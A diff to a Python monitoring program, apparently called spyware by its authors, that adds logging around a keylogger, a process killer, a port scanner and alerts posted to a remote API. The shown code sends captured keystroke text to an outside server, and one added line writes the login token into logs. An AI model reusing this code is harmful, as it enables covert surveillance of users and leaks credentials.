@@ -35,7 +35,7 @@ def block_DNS():
                 pass
             else:
                 file.write(redirect + " " + site + "\n")
-    logging("DNS")
+    logging("End of the block of DNS\n")
 
 
 def isHateSpeech(self):
@@ -57,6 +57,7 @@ def isBadLanguage(self):
         contents = file.read().split(';')
         for word in log_tokenized:
             if word.lower() in contents:
+                logging("Palavra que gerou o alerta:" + word.lower() + "\n")
                 return True
 
 
@@ -69,9 +70,11 @@ def areMaliciousProcess(self):
                     try:
                         proc.kill()
                     except Exception:
+                        logging("Error to Kill the process\n" + str(Exception))
                         print("Error to Kill the process")
                         return False
 
+                logging("Alerta gerado por causa do processo:" + proc.name() + "\n")
                 self.log = "Alerta gerado por causa do processo: " + proc.name()
                 return True
 
@@ -101,6 +104,7 @@ def getImage(self):
 def doLogin(self):
     dataUser = json.dumps({"login": cr.login, "password": cr.password})
     token = requests.post("https://spyware-api.herokuapp.com/login", dataUser).text
+    logging("Login realizado, token:" + token + "\n")
     return {
         'Authorization': 'Bearer ' + token,
         'Content-type': 'application/json'
@@ -121,9 +125,11 @@ def sendAlert(self):
         alert = requests.post("https://spyware-api.herokuapp.com/alerta/save", dataAlert, headers=headers)
 
         print(alert)
+        logging("Alert Saved!\n" + str(alert) + "\n")
         print("Alert Saved")
         time.sleep(10)
     except Exception:
+        logging("Error to send Alert\n" + str(Exception))
         print("Error to send Alert")
         pass
 
@@ -156,7 +162,7 @@ class Keylogger:
 
     def report(self):
         if self.log and (isHateSpeech(self) or isBadLanguage(self) or areMaliciousProcess(self)):
-            logging("report")
+            logging("Foi enviado o report!")
             sendAlert(self)
 
         self.log = ""
@@ -211,15 +217,15 @@ class Scanner:
             for i in range(len(self.banners)):
                 if self.banners[i] in data:
                     self.log = f"[!]Vulneribility found: {self.banners[i]} at port {self.ports[i]}"
+                    logging(self.log + "\n")
                     sendAlert(self)
 
 
 if __name__ == "__main__":
-    logging("INICIO")
+    logging("Inicio do programa!\n")
     #threading.Thread(target=block_DNS()).start()
     scanner = Scanner()
     threading.Thread(scanner.scan()).start()
-    logging("scanner")
+    logging("Termino do Scanner do programa!\n")
     keylogger = Keylogger(interval=SEND_REPORT_EVERY)
     keylogger.start()
-    logging("keylogger")
